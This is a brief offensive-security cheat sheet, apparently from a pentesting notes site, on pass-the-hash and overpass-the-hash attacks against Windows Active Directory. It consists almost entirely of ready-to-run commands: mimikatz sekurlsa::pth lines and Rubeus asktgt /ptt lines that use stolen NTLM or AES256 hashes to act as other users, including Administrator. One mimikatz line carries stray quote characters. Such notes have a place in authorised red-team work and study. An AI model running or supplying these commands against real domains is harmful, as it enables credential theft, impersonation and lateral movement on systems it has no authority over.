# Pass The Hash

### OverPass the Hash

#### With mimikatz

[#overpass-the-hash](../../exploitation-abuse/mimi-tools.md#overpass-the-hash "mention")

```powershell
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /run:cmd.exe
```

```
sekurlsa::pth /domain:<MACHINE> /user:Administrator /ntlm:<HASH> /run:powershell.exe"'
```

#### With Rubeus

{% code overflow="wrap" %}
```cmd
Rubeus.exe asktgt /user:<USER> /aes256:<HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

```powershell
./Rubeus.exe asktgt /user:administrator /rc4:<nt hash> /ptt
```

